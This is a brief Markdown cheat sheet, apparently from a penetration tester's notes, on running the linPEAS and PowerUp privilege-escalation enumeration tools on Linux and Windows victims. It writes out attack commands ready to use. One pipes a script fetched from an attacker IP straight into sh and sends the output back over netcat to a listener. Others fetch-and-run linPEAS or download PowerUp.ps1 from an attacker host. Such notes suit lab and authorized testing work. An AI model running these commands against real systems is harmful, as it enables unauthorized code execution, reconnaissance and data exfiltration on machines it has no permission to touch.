---
publish: true
created: 2026-02-06T17:44:09.841+05:30
modified: 2026-06-22T09:01:32.792+05:30
---

# Linux

## linpeas

All-in-one enumeration for linux.

```bash

### Run Linpeas
## Victim - send stderr to same as stdout
./linpeas.sh -a > linpeas.txt 2>&1 

## Read with colors
less -r linpeas.txt 


### For sending output from victim to attacker
## Run below on attacker
nc -lvnp 9002 | tee linpeas.out

## Run below on victim
curl 192.168.45.167:8000/linpeas.sh | sh | nc 192.168.45.167 9002
curl -L 10.10.16.5:8000/linpeas.sh | sh
```

# Windows

## powerup

```powershell
# Download powerup
powershell wget http://10.10.16.3:8000/PowerUp.ps1 -o powerup.ps1

# Import the module, you have two ways.
. .\PowerUp.ps1
Import-Module PowerUp.ps1

# Run all checks.
Invoke-AllChecks
```
